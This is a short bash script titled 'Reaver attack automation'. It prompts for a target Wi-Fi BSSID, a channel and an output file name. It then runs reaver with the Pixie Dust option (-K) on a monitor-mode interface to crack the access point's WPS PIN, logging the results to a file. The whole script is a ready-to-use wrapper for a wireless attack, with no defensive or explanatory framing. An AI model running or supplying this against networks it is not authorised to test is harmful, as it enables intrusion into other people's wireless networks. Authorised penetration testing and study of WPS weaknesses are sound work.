#!/bin/bash

##################################### Reaver attack automation ##################################


read -ep "Target BSSID: " tgt

read -ep "Target Channel: " chan

read -ep "Output File Name: " txt

sudo reaver -i wlan1mon -b $tgt -c $chan -K -S -vvv | tee $txt.txt
